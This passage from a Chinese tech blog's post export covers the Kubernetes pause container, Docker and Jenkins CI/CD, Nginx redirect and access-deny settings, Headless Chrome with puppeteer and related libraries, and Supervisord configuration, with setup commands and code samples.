Up 2 hours k8s_POD_coredns-77c989547b-lcbfw_kube-system_0696926b-6d79-11e8-8760-5254004f2222_1 kubernetes中的pause容器主要为每个业务容器提供以下功能： 在pod中担任Linux命名空间共享的基础； 启用pid命名空间，开启init进程。 pause容器的作用可以从这个例子中看出，首先见下图： Pause容器测试首先在节点上运行一个pause容器。 1docker run -d –name pause -p 8880:80 martin/pause-amd64:3.0 然后再运行一个nginx容器，nginx将为localhost:2398创建一个代理。 123456789101112131415$ cat &lt;&lt;EOF &gt;&gt; nginx.confferror_log stderr;events &#123; worker_connections 1024; &#125;http &#123; access_log /dev/stdout combined; server &#123; listen 80 default_server; server_name example.com www.example.com; location / &#123; proxy_pass http://127.0.0.1:2398; &#125; &#125;&#125;EOF$ docker run -d –name nginx -v &lt;span class=&quot;keyword&quot;&gt;pwd&lt;/span&gt;/nginx.conf:/etc/nginx/nginx.conf –net=container:pause –ipc=container:pause –pid=container:pause nginx 然后再为ghost创建一个应用容器，这是一款博客软件。 1$ docker run -d –name ghost –net=container:pause –ipc=container:pause –pid=container:pause ghost 现在访问http://localhost:8880/就可以看到ghost博客的界面了。 Pause容器解析pause容器将内部的80端口映射到宿主机的8880端口，pause容器在宿主机上设置好了网络namespace后，nginx容器加入到该网络namespace中，我们看到nginx容器启动的时候指定了–net=container:pause，ghost容器同样加入到了该网络namespace中，这样三个容器就共享了网络，互相之间就可以使用localhost直接通信，–ipc=contianer:pause –pid=container:pause就是三个容器处于同一个namespace中，init进程为pause，这时我们进入到ghost容器中查看进程情况。 12345678# ps auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 1024 4 ? Ss 13:49 0:00 /pauseroot 5 0.0 0.1 32432 5736 ? Ss 13:51 0:00 nginx: master psystemd+ 9 0.0 0.0 32980 3304 ? S 13:51 0:00 nginx: worker pnode 10 0.3 2.0 1254200 83788 ? Ssl 13:53 0:03 node current/inroot 79 0.1 0.0 4336 812 pts/0 Ss 14:09 0:00 shroot 87 0.0 0.0 17500 2080 pts/0 R+ 14:10 0:00 ps aux 在ghost容器中同时可以看到pause和nginx容器的进程，并且pause容器的PID是1。而在kubernetes中容器的PID=1的进程即为容器本身的业务进程。 参考Kubernetes只Pause容器 kubernetes中的infra容器——Pause容器探究","categories":[],"tags":[{"name":"K8s","slug":"K8s","permalink":"http://chucz.club/tags/K8s/"}]},{"title":"docker cicd持续集成部署","slug":"docker-cicd持续集成部署","date":"2018-08-16T23:53:55.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/16/docker-cicd持续集成部署/","link":"","permalink":"http://chucz.club/2018/08/16/docker-cicd持续集成部署/","excerpt":"","text":"持续集成的概念持续集成，Continuous integration ，简称CI。 首先，解释下集成：所有的项目代码都是托管在SVN或者GIT服务器上（以下简称代码服务器）。每个项目都有若干个单元测试和集成测试。集成测试是单元测试的逻辑扩展：在单元测试的基础上，将所有模块按照设计要求组装成为子系统或系统进行集成测试。实践表明，一些模块虽然能够单独地工作，但并不能保证连接起来也能正常的工作。一些局部反映不出来的问题，在全局上很可能暴露出来（关于单元测试及集成测试的详述，读者可以查阅相关文档）。 简单来说，集成测试就是把所有的单元测试跑一遍，以及其它一些能自动完成的测试。只有通过了集成测试的代码才能上传到代码服务器上，确保上传的代码没有问题。集成一般指集成测试。 持续，显而易见就是长期对代码进行的集成测试。既然是长期进行，那么最好是自动执行，否则人工执行既没保证，而且耗人力。 基于此种目的，我们需要有一台服务器，它将定期从代码服务器中拉取代码，并进行编译，然后自动运行集成测试；并且每次集成测试的结果都会记录在案。 持续集成的特点 它是一个自动化的周期性的集成测试过程，从拉取代码、编译构建、运行测试、结果记录、测试统计等都是自动完成的，无需人工干预； 需要有专门的集成服务器来执行集成构建； 需要有代码托管工具支持； 持续集成的作用 保证团队开发人员提交代码的质量，减轻了软件发布时的压力； 持续集成中的任何一个环节都是自动完成的，无需太多的人工干预，有利于减少重复过程以节省时间、费用和工作量； 首先，Docker可以让你非常容易和方便地以“容器化”的方式去部署应用。 它就像集装箱一样，打包了所有依赖，再在其他服务器上部署很容易，不至于换服务器后发现各种配置文件散落一地，这样就解决了编译时依赖和运行时依赖的问题； 其次，Docker的隔离性使得应用在运行是就像处于沙箱中一样，每个应用都认为自己是在系统中唯一运行的程序，就像刚才例子中，A依赖于Python 2.7，同时A还依赖于B，但B却依赖于Python3， 这样我们可以在系统中部署一个基于python2.7的容器和一个基于python3的容器，这样就可以很方便的在系统中部署多种不同的环境来解决依赖复杂度的问题。这里有些朋友可能会说，虚拟机也可以解决这样的问题！诚然，虚拟化确实可以做到这一点，但是这样需要硬件支持虚拟化及开启BIOS中虚拟化相关的功能，同时还需要在系统中安装2套操作系统，虚拟机的出现是解决了操作系统和物理机的强耦合问题。但是Docker就轻量化很多，只需内核支持，无需硬件和BIOS的强制要求，可以很轻松迅速的在系统上部署多套不同的容器环境，容器的出现解决了应用和操作系统的强耦合问题。 正以为Docker是以应用为中心，镜像中打包了应用及应用所需的环境，一次构建，处处运行。这种特性完美的解决了传统模式下应用迁移后面临的环境不一致问题。 同时，Docker 压根不管内部应用怎么启动，你自己爱咋来咋来，我们用 docker start 或 run 作为统一标准。这样我们应用启动就标准化了， 不需要再根据不同应用而记忆一大串不同的启动命令。 基于Docker的特征，现在常见的利用 Docker 进行持续集成的流程如下： 开发者提交代码 触发镜像构建 构建镜像上传至私有仓库 镜像下载至执行机器 镜像运行 其基本拓扑结构如下所示： 熟悉Docker的都知道，Docker以的启动是非常快的，可以说是秒启。在上述的五步中，1 和 5 的耗时是比较短的，整个持续集成主要耗时集中在中间的3个步骤，也就是 Docker build，Docker push ，Docekr pull 的时间消耗. Docker Registry升级到 v2 后加入了很多安全相关检查，在v2中的镜像的存储格式变成了gzip ，镜像在压缩过程中占用的时间也是比较多的。 Docker pull 镜像的速度对服务的启动速度至关重要，好在 Registry v2 后可以并行 pull 了，速度有了很大的改善。但是依然有一些小的问题影响了启动的速度： 下载镜像和解压镜像是串行的； 串行解压，由于 v2 都是 gzip,要解压，尽管并行下载了还是串行解压，内网的话解压时间比网络传输都要长； 和 Registry 通信， Registry 在 pull的过程中并不提供下载内容只是提供下载URL和鉴权，这一部分加长网络传输而且一些 Metadata还是要去后端存储获取，延时还是有一些的。 整个持续集成平台架构演进到如下图所示：","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"http://chucz.club/tags/docker/"}]},{"title":"kubernetes-jenkins-ci-cd","slug":"kubernetes-jenkins-ci-cd","date":"2018-08-16T23:53:11.000Z","updated":"2018-09-28T08:25:28.616Z","comments":true,"path":"2018/08/16/kubernetes-jenkins-ci-cd/","link":"","permalink":"http://chucz.club/2018/08/16/kubernetes-jenkins-ci-cd/","excerpt":"","text":"流程图：基于Jenkins的CI/CD流程如下所示: 流程说明： 用户向Gitlab提交代码，代码中必须包含Dockerfile 将代码提交到远程仓库 用户在发布应用时需要填写git仓库地址和分支、服务类型、服务名称、资源数量、实例个数，确定后触发Jenkins自动构建 Jenkins的CI流水线自动编译代码并打包成docker镜像推送到Harbor镜像仓库 Jenkins的CI流水线中包括了自定义脚本，根据我们已准备好的kubernetes的YAML模板，将其中的变量替换成用户输入的选项 生成应用的kubernetes YAML配置文件 更新Ingress的配置，根据新部署的应用的名称，在ingress的配置文件中增加一条路由信息 更新PowerDNS，向其中插入一条DNS记录，IP地址是边缘节点的IP地址。关于边缘节点，请查看边缘节点配置 Jenkins调用kubernetes的API，部署应用","categories":[],"tags":[{"name":"K8s","slug":"K8s","permalink":"http://chucz.club/tags/K8s/"}]},{"title":"Nginx配置相关笔记","slug":"Nginx配置相关笔记","date":"2018-07-26T19:47:15.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/07/26/Nginx配置相关笔记/","link":"","permalink":"http://chucz.club/2018/07/26/Nginx配置相关笔记/","excerpt":"","text":"好久没更，来水一篇～！～ 就在刚刚，我花了四百大洋租了台腾讯云香港的服务器（～心在滴血～），因此我的博客终于可以宣告回国了。PS：之前一直使用github-page，众所周知速度贼慢，后面换成了新加坡的VPS服务器，速度就更慢了，没办法只能花大价钱买国内的云服务器。博客迁移得过程比较简单，无非就是添加nginx解析，因此本篇有点水，主要为了记录一下nginx配置web服务的一些笔记。 http 301 https我的博客使用了腾讯云免费签发的证书，因此可以使用https访问，默认情况下http也是可以访问的，那么如何将http请求301重定向到https，便是第一个要解决的问题。编辑/etc/nginx/nginx.conf文件： 12345678910111213……server &#123; listen 80; server_name thief.one; return 301 https://$server_name$request_uri;&#125;server &#123; listen 443; server_name thief.one; ……&#125;…… 创建一个80端口，一个443端口的web服务，并且将80端口的服务重定向到https://….。重启nginx后，访问http://thief.one会被301重定向到https://thief.one 禁止访问某些目录文件由于我的博客项目存放在git上，因此服务器web目录内含有.git目录，也算是敏感信息泄露（当然都是一些静态的网页，其实也没有什么危害），那么如何在nginx中配置访问.git目录403是要解决的第二个问题。编辑/etc/nginx/nginx.conf文件： 123456789server &#123; listen 443; server_name thief.one; …… location /.git/ &#123; deny all; &#125;&#125; 添加一个location，禁止访问某目录。重启nginx后，尝试访问https://thief.one/.git/config 返回403 负载均衡这个之前总结过：https://thief.one/2017/08/22/1/ 只能通过域名访问如果博客不想通过IP被访问到，需要在nginx上配置禁止ip访问，或者访问ip跳转到域名。编辑/etc/nginx/nginx.conf文件： 12345server &#123; listen 80 default_server; listen 443 default_server; return 403&#125; 重启nginx，访问：http://150.109.106.49/ 返回403。 权限问题首先说明一下，一般我不推荐使用root权限启动nginx服务。但如果nginx服务是用root权限安装的，且网站放在root目录下，启动nginx解析网站会有权限问题（因为配置文件中默认不是用root权限启动），因此需要更改配置文件为： 1user root; 更安全的方法是用普通用户权限安装nginx，并将web目录移到普通用户目录下，用普通用户权限启动nginx服务。 nginx配置相关问题笔记，之后我都会记录在此篇中","categories":[],"tags":[{"name":"技术研究","slug":"技术研究","permalink":"http://chucz.club/tags/技术研究/"},{"name":"nginx","slug":"nginx","permalink":"http://chucz.club/tags/nginx/"}]},{"title":"Headless Chrome and API","slug":"Headless-Chrome-and-API","date":"2018-07-09T00:59:10.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/07/09/Headless-Chrome-and-API/","link":"","permalink":"http://chucz.club/2018/07/09/Headless-Chrome-and-API/","excerpt":"","text":"我已爬遍了全世界，而你却迟迟不见 自从Google在chrome59版本后加入了 Headless Chrome，类似phantomjs、selenium等工具作者都放弃了维护自身的产品（原因可参考文章 QtWebkit or Headless Chrome）。因此作为使用者的我们也是时候放弃phantomjs，转而研究Headless Chrome了。由于网上对于Headless Chrome的资料还很少，因此我先收集整理一波，随后慢慢学习研究，渐渐将本篇内容补充完善。 Headless Chrome 介绍headless chrome意思是无头chrome浏览器，相对于传统的chrome浏览器，这是一个可以在后台用命令行操作浏览器的工具，对于爬虫编写以及web自动化测试都有很大的作用。相比较同类工具Phantomjs，其更加强大（主要因为其依赖的webkit更新）。 Headless Chrome 安装目前只支持mac与linux系统，需要下载chrome浏览器并安装。 mac install headless chromemac下直接去官网下载安装包即可，mac下chrome浏览器位置，为了方便使用，用alias别名启动。 123alias chrome=“/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome”alias chrome-canary=“/Applications/Google\\ Chrome\\ Canary.app/Contents/MacOS/Google\\ Chrome\\ Canary”alias chromium=“/Applications/Chromium.app/Contents/MacOS/Chromium” 下载chrome-canary版 说明：Mac 和 Linux 上的 Chrome 59 都可以运行无需显示模式。对 Windows 的支持将在 Chrome 60 中提供。要检查你使用的 Chrome 版本，请在浏览器中打开 chrome://version。 linux install headless chrome添加源： 123456789vim /etc/yum.repos.d/chrome.repo写入以下内容：[google-chrome]name=google-chromebaseurl=http://dl.google.com/linux/chrome/rpm/stable/$basearchenabled=1gpgcheck=0gpgkey=https://dl-ssl.google.com/linux/linux_signing_key.pub 安装： 1yum install -y google-chrome-stable 测试运行： 1google-chrome –headless –print-to-pdf https://thief.one 报错处理： 1Running as root without –no-sandbox is not supported # 错误信息 解析方案： 123vim /opt/google/chrome/google-chrome找到 exec -a “$0“ “$HERE/chrome” “$@“改为 exec -a “$0“ “$HERE/chrome” “$@“ –user-data-dir –no-sandbox 说明：若在安装过程中报错，则将源文件中的gpgcheck改为0 linux安装headless chrome参考：http://akai-tsuki.hatenablog.com/entry/2017/06/18/000000 Headless Chrome 基础用法HELP信息： 123456chrome \\–headless \\ # Runs Chrome in headless mode.–disable-gpu \\ # Temporarily needed for now.–remote-debugging-address=127.0.0.1–remote-debugging-port=9222 \\ https://thief.one # URL to open. Defaults to about:blank. 访问一个网页获取源码–dump-dom 标志将打印 document.body.innerHTML 到标准输出： 1chrome –headless –disable-gpu –dump-dom https://thief.one/ 访问一个网页将源码创建成一个PDF–print-to-pdf 标志将页面转出为 PDF 文件： 1chrome –headless –disable-gpu –print-to-pdf https://thief.one/ 访问一个网页并截图使用–screenshot标志运行 Headless Chrome 将在当前工作目录中生成一个名为 screenshot.png的文件： 1234chrome –headless –disable-gpu –screenshot https://thief.one/# 设置图片大小chrome –headless –disable-gpu –screenshot –window-size=1280,1696 https://thief.one/ 访问一个网页并进行js交互（REPL模式）–repl 标志可以使 Headless Chrome 运行在一个你可以使用浏览器评估 JS 表达式的模式下。执行下面的命令： 1234chrome –headless –disable-gpu –repl https://thief.one&gt;&gt;&gt; location.href&#123;“result”:&#123;“type”:“string”,“value”:“https://thief.one&quot;&#125;&#125;&gt;&gt;&gt; quit 启动一个监听端口1chrome –remote-debugging-port=9222 –remote-debugging-address=0.0.0.0 可以通过浏览器打开：http://0.0.0.0:9222 Headless Chrome API以上演示了使用命令行的方式操作headless chrome，那么怎么在代码中使用它呢？api工具如下：官方：puppeteer底层：chrome-remote-interface活跃：chromeless非官方：headless-chrome-crawler Python相关的API：pychromePyppeteer 推荐chromotechrome_remote_interface_python puppeteer 介绍Puppeteer 是一个由 Chrome 团队开发的 Node 库。它提供了一个高层次的 API 来控制无需显示版（或 完全版）的 Chrome。它与其他自动化测试库，如 Phantom 和 NightmareJS 相类似，但是只适用于最新版本的 Chrome。 puppeteer 安装1234mkdir puppeteer_test # 创建一个项目目录cd puppeteer_testnpm initnpm i –save puppeteer 安装puppeteer前需要在系统上安装nodejs与npm；安装完puppeteer，默认会自动安装最新版本的chromium。注意：系统默认安装的npm与nodejs版本都很低，而使用puppeteer需要node6.4.0+，async/await需要node7.6.0+，因此建议安装node7.6.0版本，否则会导致无法使用。 安装升级nodejs与npm要安装puppeteer，需要先安装npm与nodejs，而puppeteer对nodejs版本有要求，因此不能用系统默认安装的nodejs版本。 12wget http://nodejs.org/dist/v7.6.0/node-v7.6.0-linux-x64.tar.gztar -zvxf node-v7.6.0-linux-x64.tar.gz 共享至全局 123rm -rf /usr/bin/node /usr/bin/npmln -s /path/node-v7.6.0-linux-x64/bin/node /usr/bin/node ln -s /path/node-v7.6.0-linux-x64/bin/npm /usr/bin/npm 若用yum安装过nodejs，需要移除其他版本: 12yum remove npmyum remove nodejs 查看nodejs与npm版本： 12node -vnpm -v 安装升级nodejs过程参考：http://jeeinn.com/2017/02/236/ puppeteer 使用在使用puppeteer前，先要确定puppeteer、nodejs、npm安装成功（版本正确），且headless chrome安装成功。官方API文档：https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md 打印用户代理：在puppeteer_test目录下创建一个example1.js文件，写入： 12345678910const puppeteer = require(‘puppeteer’);(async() =&gt; &#123; const browser = await puppeteer.launch(&#123; headless: true, args: [‘–no-sandbox’, ‘–disable-setuid-sandbox’],&#125;); console.log(await browser.version()); browser.close();&#125;)(); 运行代码: 1node example1.js 获取页面的屏幕截图：创建一个example2.js文件，写入： 1234567891011121314const puppeteer = require(‘puppeteer’);(async() =&gt; &#123;const browser = await puppeteer.launch(&#123; headless: true, args: [‘–no-sandbox’, ‘–disable-setuid-sandbox’],&#125;);const page = await browser.newPage();await page.goto(‘https://thief.one&#39;, &#123;waitUntil: ‘networkidle2’&#125;);await page.pdf(&#123;path: ‘screen.pdf’, format: ‘A4’&#125;);browser.close();&#125;)(); 运行代码： 1node example2.js 说明：在运行puppeteer之前不需要额外开启一个headless-chrome进程，因为其本身就会去开启。 发送POST请求获取源码12345678910111213141516171819const puppeteer = require(‘puppeteer’);puppeteer.launch(&#123;headless: true,args: [‘–no-sandbox’, ‘–disable-setuid-sandbox’],&#125;).then(async browser =&gt; &#123; const page = await browser.newPage(); await page.setRequestInterception(true); // 开启请求捕捉 page.on(‘request’, interceptedRequest =&gt; &#123; const overrides = &#123;&#125;; //console.log(interceptedRequest.url()); // 输出捕捉到的请求URL if (interceptedRequest.url()==‘http://127.0.0.1:8000/&#39;)&#123; overrides.method = ‘POST’; overrides.postData = ‘&#123;”id”:”2”&#125;’; &#125; interceptedRequest.continue(overrides); // 重放 &#125;); await page.goto(‘http://127.0.0.1:8000/&#39;); await console.log(await page.content()); // 输出源码 await browser.close();&#125;); 安装puppeteer报错在linux下安装puppeteer报错，即: 1npm i –save puppeteer 命令没有运行成功 失败原因可能是linux版本不支持，centos7下成功，centos6下测试失败。 运行puppeteer报错处理报错如下，说明代码语法有问题，或者node版本太低，不符合要求： 1SyntaxError: Unexpected token function 报错如下，说明代码中需要设置headless状态为true 1Failed to launch chrome 解决方案，修改代码为如下： 1234const browser = await puppeteer.launch(&#123; headless: true, args: [‘–no-sandbox’, ‘–disable-setuid-sandbox’], &#125;); 报错如下，与上面解决方案一致： 11025/084740.006078:ERROR:zygote_host_impl_linux.cc(88)] Running as root without –no-sandbox is not supported. See https://crbug.com/638180. pyppeteerpyppeteer模版是对puppeteer的python封装，因为puppeteer是用nodejs写的，所以要在python中使用得用pyppeteer模块。 pyppeteer安装pyppeteer模版只支持python3.5以上版本。 1python3 -m pip install pyppeteer pyppeteer简单的例子截图： 1234567891011import asynciofrom pyppeteer import launchasync def main(): browser = await launch(args=[‘–no-sandbox’]) page = await browser.newPage() await page.goto(‘http://example.com&#39;) await page.screenshot(&#123;‘path’: ‘example.png’&#125;) await browser.close()asyncio.get_event_loop().run_until_complete(main()) 说明：在使用pyppeteer时，不需要额外开启headless-chrome进程（与puppeteer一样）。更多pyppeteer模版使用方法，参考：https://miyakogi.github.io/pyppeteer/reference.html#page-class pyppeteer报错处理错误类似如下： 1pyppeteer.errors.BrowserError: Failed to connect to browser port: http://127.0.0.1:58871/json/version 解决方案： 123加上：args=[‘–no-sandbox’]，同puppeteer类似。browser = await launch(args=[‘–no-sandbox’]) chrome-remote-interface工具可以用来分析渲染一个页面过程中所有的请求过程，包括获取所有的请求接口以及响应内容等。再运行chrome-remote-interface代码前，需要先启动headless chrome进程，即： 1chrome –headless –remote-debugging-port=9222 安装chrome-remote-interface： 1npm install chrome-remote-interface 然后编写代码：(以获取所有请求url为例) 1234567891011121314151617181920212223242526272829303132const CDP = require(‘chrome-remote-interface’);// node nmask.js https://nmask.cnvar options = process.argv;var target_url = options[2];CDP((client) =&gt; &#123; // extract domains const &#123;Network, Page&#125; = client; // setup handlers Network.requestWillBeSent((params) =&gt; &#123; console.log(params.request.url); &#125;); Page.loadEventFired(() =&gt; &#123; client.close(); &#125;); // enable events then start! Promise.all([ Network.enable(), Page.enable() ]).then(() =&gt; &#123; return Page.navigate(&#123;url: target_url&#125;);//输出请求的url &#125;).catch((err) =&gt; &#123; console.error(err); client.close(); &#125;);&#125;).on(‘error’, (err) =&gt; &#123; console.error(err);&#125;); 运行这段代码： 1node nmask.js https://thief.one chromeless介绍chromeless社区比较火热，代码更新也非常频繁，个人比较看好。 chromeless安装chromeless对nodejs版本要求是&gt;8.2(centos7下node7.6测试可以)，因此需要先升级nodejs，升级方法参考前文；升级完以后，再安装chromeless项目环境。 1234mkdir chromeless_testcd chromeless_testnpm initnpm install chromeless chromeless使用官方API文档：https://github.com/graphcool/chromeless/blob/master/docs/api.md#api-goto在线代码运行环境：https://chromeless.netlify.com 创建chromeless_test.js,写入： 123456789101112131415161718const &#123; Chromeless &#125; = require(‘chromeless’)async function run() &#123; const chromeless = new Chromeless() const screenshot = await chromeless .goto(‘https://www.baidu.com&#39;) //.type(‘chromeless’, ‘input[name=”q”]’) //.press(13) //.wait(‘#resultStats’) .screenshot() console.log(screenshot) // prints local file path or S3 url await chromeless.end()&#125;run().catch(console.error.bind(console)) 运行代码： 12nohup google-chrome –headless –remote-debugging-port=9222 &amp; #开启本地headless chromenode chromeless_test.js 注意：在运行chromeless前，需要先安装headless chrome，并且需要在本地开启--remote-debugging-port=9222，监听本地9222端口；chromeless也支持使用远程的headless chrome pychrome工具暂没有研究，尽情期待！ 常见问题Linux截图中文字体变方块如何解决？出现这类问题主要是因为linux服务器字体缺失的问题，解决方案是将字体文件copy到linux服务器/usr/share/fonts/zh_CN目录下。 第一步：从windows或者mac上获取字体文件，mac上的字体文件地址为：/Library/Fonts，windows字体地址为：c盘下的Windows/Fonts。将Fonts目录打包上传到linux服务器/usr/share/fonts/zh_CN目录下，然后解压。 第二步：设置权限 1chmod -R 755 /usr/share/fonts/zh_CN 第三步：生成fonts.scale 12yum -y install ttmkfdirttmkfdir -e /usr/share/X11/fonts/encodings/encodings.dir 第四步：修改字体配置文件 123456vim /etc/fonts/fonts.conf在&lt;dir&gt;….&lt;/dir&gt;列表中添加字体如：&lt;dir&gt;/usr/share/fonts/zh_CN/Fonts&lt;/dir&gt; 第五步：刷新字体缓存 1fc-cache 命令行运行headless chrome需要使用–disable-gpu参数吗？1目前–disable-gpu 标志在处理一些bug时是需要的，在未来版本的 Chrome 中就不需要了。 系统仍然需要安装Xvfb吗？1234不需要，Headless Chrome 不使用窗口，所以不需要像 Xvfb 这样的显示服务器。你问什么是 Xvfb？Xvfb 是一个用于类 Unix 系统的运行于内存之内的显示服务器，可以让你运行图形应用程序（如 Chrome），而无需附加的物理显示器。许多人使用 Xvfb 运行早期版本的 Chrome 进行 “headless” 测试。 如何创建一个运行 Headless Chrome 的 Docker 容器？1查看 lighthouse-ci。它有一个使用 Ubuntu 作为基础镜像的 Dockerfile 示例，并且在 App Engine Flexible 容器中安装和运行了 Lighthouse。 headless chrome和 PhantomJS 有什么关系？1Headless Chrome 和 PhantomJS 是类似的工具。它们都可以用来在无需显示的环境中进行自动化测试。两者的主要不同在于 Phantom 使用了一个较老版本的 WebKit 作为它的渲染引擎，而 Headless Chrome 使用了最新版本的 Blink。 下篇将介绍分布式漏扫爬虫框架的设计与实现，以及写爬虫过程中需要注意的点 参考文章https://zhuanlan.zhihu.com/p/29207391https://developers.google.com/web/updates/2017/04/headless-chromehttps://juejin.im/entry/58fd5e645c497d005803b6a4http://csbun.github.io/blog/2017/09/puppeteer/","categories":[],"tags":[{"name":"爬虫技术","slug":"爬虫技术","permalink":"http://chucz.club/tags/爬虫技术/"},{"name":"Headless Chrome","slug":"Headless-Chrome","permalink":"http://chucz.club/tags/Headless-Chrome/"},{"name":"Puppeteer","slug":"Puppeteer","permalink":"http://chucz.club/tags/Puppeteer/"},{"name":"pychrome","slug":"pychrome","permalink":"http://chucz.club/tags/pychrome/"},{"name":"chromeless","slug":"chromeless","permalink":"http://chucz.club/tags/chromeless/"}]},{"title":"Supervisord管理进程实践","slug":"Supervisord管理进程实践","date":"2018-06-24T18:59:38.000Z","updated":"2018-09-28T08:51:24.508Z","comments":true,"path":"2018/06/24/Supervisord管理进程实践/","link":"","permalink":"http://chucz.club/2018/06/24/Supervisord管理进程实践/","excerpt":"","text":"小孩在门前唱着歌阳光它照暖了溪河 今天凑空研究了下Supervisord，这是一款linux进程管理工具，使用python开发，主要用于在后台维护进程（类似master守护进程），可以实现监控进程的状态、自动重启进程等操作，便于一些服务的维护与监控。 安装Supervisord由于是用python开发的，因此使用pip安装最为方便。 1$ pip install supervisor 说明：安装完成之后多了3个工具：echo_supervisord_conf、supervisorctl和supervisord。 Supervisord配置文件首先可以使用echo_supervisord_conf命令获取supervisor配置模板： 1echo_supervisord_conf &gt; supervisord.conf 说明：该命令在当前目录下创建了一个文件名为supervisord.conf的配置文件，编辑配置文件： 1vim supervisord.conf 来看看默认配置文件中的主要配置项：（还有一些配置不常用，可以忽略） 123456789101112131415161718192021222324252627282930313233[unix_http_server]file=/tmp/supervisor.sock ; UNIX socket 文件，supervisorctl 会使用;chmod=0700 ; socket 文件的 mode，默认是 0700;chown=nobody:nogroup ; socket 文件的 owner，格式： uid:gid;[inet_http_server] ; HTTP 服务器，提供 web 管理界面;port=127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性;username=user ; 登录管理后台的用户名;password=123 ; 登录管理后台的密码[supervisord]logfile=/tmp/supervisord.log ; 日志文件，默认是 $CWD/supervisord.loglogfile_maxbytes=50MB ; 日志文件大小，超出会 rotate，默认 50MBlogfile_backups=10 ; 日志文件保留备份数量默认 10loglevel=info ; 日志级别，默认 info，其它: debug,warn,tracepidfile=/tmp/supervisord.pid ; pid 文件nodaemon=false ; 是否在前台启动，默认是 false，即以 daemon 的方式启动minfds=1024 ; 可以打开的文件描述符的最小值，默认 1024minprocs=200 ; 可以打开的进程数的最小值，默认 200; the below section must remain in the config file for RPC; (supervisorctl/web interface) to work, additional interfaces may be; added by defining them in separate rpcinterface: sections[rpcinterface:supervisor]supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface[supervisorctl]serverurl=unix:///tmp/supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致;serverurl=http://127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord; 包含其他的配置文件[include]files = relative/directory/.ini ; 可以是 .conf 或 *.ini 运行以下命令启动supervisord进程，可测试supervisord是否安装成功并执行。 1supervisord -c supervisord.conf 查看系统进程中是否多了一个supervisord： 1ps -aux | grep supervisord 配置Program program就是用来配置监控不同的应用程序进程的，推荐每个应用程序单独写一个program配置文件，然后在supervisord.conf中通过include加载所有应用程序的配置。这里拿创建一个celery进程为例，首先在supervisord.conf最后一行写入： 123;加载/etc/supervisor/目录下所有的配置文件[include]files = /etc/supervisor/*.conf 然后创建/etc/supervisor目录，并到目录下创建/etc/supervisor/celery_touchscan.conf文件，写入： 123456789101112131415161718192021222324;program名称，随便写，但不要重复，是program的唯一标识[program:celery_touchscan];指定运行目录directory=/root/TouchScanV2/ ;运行目录下执行命令command=celery -A scan worker –queue=touchscan –pidfile=“./log/pid.txt” –logfile=“./log/scan.log” -c 10;进程名称process_name=%(program_name)s_%(process_num)02d;启动设置numprocs=1 ;进程数，注意：（celery进程数量,不是work数量，相当于执行了10个command命令，而不是在celery中指定-c 为10）autostart=true ;当supervisor启动时,程序将会自动启动autorestart=true ;自动重启（当work被kill了之后会重新启动）;运行程序的用户;user=root;startsecs=1 ;程序重启时候停留在runing状态的秒数;startretries=10 ;启动失败时的最多重试次数;停止信号,默认TERM;中断:INT (类似于Ctrl+C)(kill -INT pid)，退出后会将写文件或日志(推荐);终止:TERM (kill -TERM pid);挂起:HUP (kill -HUP pid),注意与Ctrl+Z/kill -stop pid不同;从容停止:QUIT (kill -QUIT pid)stopsignal=INT 重启supervisord进程： 1supervisorctl -c supervisord.conf reload 此时查看系统上的进程，发现创建了一个supervisord守护进程，10个celery的work进程（celery的work进程数量取决于command命令中的-c参数以及配置文件中的numprocs参数，numprocs参数是指运行几次command命令，而在celery命令行中指定了需要运行的work数量） 说明：此时如果手动kill掉celery的work进程，会发现celery的work进程会被supervisord自动重启，只有当supervisord守护进程被kill以后，才能真正kill掉celery的work进程。 supervisord命令行操作启动supervisord进程1supervisord -c supervisord.conf 关闭supervisord进程1supervisorctl -c supervisord.conf shutdown #注意这里将supervisord进程关闭，但通过supervisord启动的进程没有关闭 重启supervisord进程1supervisorctl -c supervisord.conf reload 查看进程状态1supervisorctl 效果如下：每列分别代表：programe名称、进程名称，进程状态、进程id，运行时间 更多supervisorctl命令123456$ supervisorctl status$ supervisorctl stop celery_touchscan # celery_touchscan是一个program的名称$ supervisorctl start celery_touchscan$ supervisorctl restart celery_touchscan$ supervisorctl reread$ supervisorctl update 说明：可以直接在系统shell中执行，也可以先执行supervisorctl，进入supervisorctl_shell中执行相应的命令。 针对Python环境如果项目使用了python的pyenv模块来设置环境，则supervisord配置文件中需要指定python环境的路径。其中有两种方式指定程序使用的Python环境： command使用绝对路径。 通过environment配置PYTHONPATH。 使用supervisord注意点子进程问题有时候用Supervisor托管的程序还会有子进程，如果只杀死主进程，子进程就可能变成孤儿进程。通过以下这两项配置来确保所有子进程都能正确停止： 12stopasgroup=truekillasgroup=true 配置更新每次修改supervisord配置文件后，需要重启supervisord进程。 后台程序问题Supervisor只能管理在前台运行的程序，所以如果应用程序有后台运行的选项，需要关闭。 supervisord与定时任务supervisord主要用来管理进程，而不是调度任务，因此如果有定时任务的需求，跟结合crontab一起使用。当然如果是管理celery服务，可以结合celery自身的定时任务功能，具体可移步：https://thief.one/2017/08/25/1/ supervisord xml-rpc前面介绍的都是在本地利用supervisord管理进程，那么如何实现在远处管理服务器上的进程呢？supervisord工具提供了相关的api。首先需要在配置文件中打开相关配置信息： 1234[inet_http_server] ; HTTP 服务器，提供 web 管理界面port=127.0.0.1:9001 ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性username=user ; 登录管理后台的用户名password=123 ; 登录管理后台的密码 然后启动supervisord后，可以用web界面管理进程，打开http://127.0.0.1:9001。当然也提供了rpc接口，可供远程调用，代码样例如下： 123456789import xmlrpclibserver = xmlrpclib.Server(‘http://user:123@127.0.0.1:9111/RPC2&#39;) #连接rpc服务# print server.system.listMethods() # 查询api支持的方法# print server.supervisor.getState() # 获取supervisord进程状态# print server.supervisor.shutdown() # 关闭supervisor,慎用# print server.supervisor.restart() # 重启supervisorprint 